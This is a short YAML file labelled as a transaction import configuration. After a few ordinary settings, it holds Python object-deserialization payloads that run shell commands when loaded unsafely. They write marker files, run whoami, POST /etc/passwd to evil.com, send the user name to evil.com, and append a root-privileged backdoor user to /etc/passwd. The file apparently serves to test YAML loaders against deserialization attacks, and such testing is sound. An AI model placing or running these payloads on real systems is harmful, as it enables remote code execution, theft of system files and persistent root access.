# Innocent looking transaction import configuration
transaction_count: 150
import_rules:
  validation: strict
  currency: USD
  batch_size: 50

processing:
  parallel: true
  validate_amounts: true

# YAML deserialization attacks
malicious_loader: !!python/object/apply:os.system
  - ["echo YAML_PWNED > /tmp/yaml_hacked.txt"]

# Alternative attack - subprocess
command_exec: !!python/object/apply:subprocess.check_output
  - ["whoami"]

# File exfiltration
data_theft: !!python/object/apply:os.system
  - ["curl -X POST http://evil.com/exfil --data @/etc/passwd"]

# Complex object instantiation for RCE
evil_object: !!python/object/apply:eval
  - ["__import__('os').system('echo YAML_EVAL_ATTACK > /tmp/yaml_eval.txt')"]

# Create backdoor user
backdoor: !!python/object/apply:os.system
  - ["echo 'hacker:$6$salt$hash:0:0:Evil User:/root:/bin/bash' >> /etc/passwd"]

# Network callback
callback: !!python/object/apply:os.system
  - ["curl http://evil.com/callback?source=yaml&user=$(whoami)"]